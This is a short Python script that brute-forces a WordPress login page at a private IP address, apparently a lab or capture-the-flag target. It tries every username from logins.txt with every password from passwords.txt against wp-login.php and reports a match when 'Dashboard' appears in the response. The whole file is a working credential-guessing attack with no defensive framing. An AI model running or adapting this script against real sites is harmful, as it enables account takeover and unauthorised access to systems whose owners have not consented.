import requests

url = 'http://10.100.1.109/wp-login.php'
logins = open('logins.txt', 'r').readlines()
passwords = open('passwords.txt', 'r').readlines()


def main():
    for line1 in logins:
        for line2 in passwords:
            login = line1.strip()
            password = line2.strip()
            http = requests.post(url, data={'log': login, 'pwd': password, 'wb_submit': 'submit'})
            content = http.content
            if b'Dashboard' in content:
                print('Found user: '+login+' with password '+password)
                break
            else:
                print('Invalid data '+login+' : '+password)


if __name__ == '__main__':
    main()